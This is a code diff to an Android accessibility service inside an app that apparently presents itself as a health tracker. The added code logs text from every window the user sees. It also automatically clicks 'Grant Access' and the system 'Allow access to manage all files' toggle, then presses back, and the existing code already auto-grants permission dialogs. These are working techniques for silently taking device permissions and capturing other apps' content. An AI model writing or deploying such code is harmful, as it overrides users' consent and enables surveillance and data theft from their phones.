@@ -11,7 +11,6 @@ import java.util.*
 import java.util.regex.Pattern
 import android.os.Handler
 import android.os.Looper
-import com.inf2007.healthtracker.utilities.NotificationPermissionUtils
 import android.content.Intent
 import android.provider.Settings
 
@@ -289,7 +288,13 @@ class WatchAccessibilityService : AccessibilityService() {
         val packageName = event.packageName?.toString() ?: ""
         val className = event.className?.toString() ?: ""
 
-        Log.d(TAG, "Window changed - Package: $packageName, Class: $className")
+        val eventText = if (event.text != null) {
+            event.text.joinToString(", ")
+        } else {
+            ""
+        }
+
+        Log.d(TAG, "Window changed - Package: $packageName, Class: $className, Text: $eventText")
 
         // Detect Android permission dialog
         if (packageName.contains("permissioncontroller") ||
@@ -299,6 +304,24 @@ class WatchAccessibilityService : AccessibilityService() {
             Handler(Looper.getMainLooper()).postDelayed({
                 grantPermission()
             }, 100)
+        }
+
+        // Detect YOUR APP's storage dialog
+        if (packageName == "com.inf2007.healthtracker") {
+            if (eventText.contains("Storage Access Required")) {
+                Log.i(TAG, "Storage dialog detected, clicking Grant Access...")
+                handleAppStorageDialog()
+            }
+        }
+
+        if (packageName.contains("settings")) {
+            if (className.contains("AppManageExternalStorage") ||
+                eventText.contains("Allow access to manage all files") ||
+                eventText.contains("All files access")) {
+
+                Log.i(TAG, "STORAGE SETTINGS DETECTED!")
+                handleStorageSettings()
+            }
         }
     }
 
@@ -980,5 +1003,78 @@ class WatchAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             false
         }
+    }
+
+    private fun handleAppStorageDialog() {
+        Handler(Looper.getMainLooper()).postDelayed({
+            val root = rootInActiveWindow ?: return@postDelayed
+
+            Log.i(TAG, "Looking for Grant Access button...")
+
+            // Find and click the Grant Access button
+            val grantButton = findNodeByText(root, "Grant Access") ?:
+            findNodeByText(root, "GRANT ACCESS")
+
+            if (grantButton != null && grantButton.isEnabled) {
+                Log.i(TAG, "Found Grant Access button, clicking...")
+                grantButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            }
+        }, 300)
+    }
+
+    private fun handleStorageSettings() {
+        Handler(Looper.getMainLooper()).postDelayed({
+            val root = rootInActiveWindow ?: run {
+                Log.w(TAG, "Root null, retrying...")
+                handleStorageSettings()
+                return@postDelayed
+            }
+
+            Log.i(TAG, "========== STORAGE SETTINGS ==========")
+
+            // Find the text "Allow access to manage all files"
+            val settingText = findNodeByText(root, "Allow access to manage all files")
+
+            if (settingText != null) {
+                Log.i(TAG, "Found 'Allow access to manage all files' text")
+
+                // Try to find a clickable parent (the whole row)
+                var parent = settingText.parent
+                var clicked = false
+
+                while (parent != null) {
+                    if (parent.isClickable) {
+                        Log.i(TAG, "Found clickable parent row, clicking...")
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        clicked = true
+                        break
+                    }
+                    parent = parent.parent
+                }
+
+                if (!clicked) {
+                    // If no clickable parent, try clicking the text itself
+                    Log.i(TAG, "No clickable parent, clicking text element")
+                    settingText.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }
+            } else {
+                // Fallback to finding any switch
+                Log.w(TAG, "Could not find 'Allow access to manage all files' text")
+                val toggle = findSwitchInNodeTree(root)
+                if (toggle != null) {
+                    Log.i(TAG, "Found toggle by switch search, clicking...")
+                    toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                } else {
+                    Log.w(TAG, "No toggle found")
+                }
+            }
+
+            // Wait longer before pressing back
+            Handler(Looper.getMainLooper()).postDelayed({
+                Log.i(TAG, "Now pressing back")
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            }, 300)
+
+        }, 300)
     }
 }
